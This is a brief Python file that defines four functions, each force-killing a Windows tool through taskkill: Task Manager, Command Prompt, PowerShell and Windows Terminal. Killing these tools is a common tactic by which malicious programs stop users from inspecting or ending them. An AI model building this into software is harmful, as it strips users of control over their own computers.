import subprocess

def killTaskManager():
    subprocess.call("taskkill /F /IM Taskmgr.exe", shell = True)

def killCommandPrompt():
    subprocess.call("taskkill /F /IM cmd.exe", shell=True)

def killPowerShell():
    subprocess.call("taskkill /F /IM powershell.exe", shell=True)

def killWindowsTerminal():
    subprocess.call("taskkill /F /IM WindowsTerminal.exe", shell=True)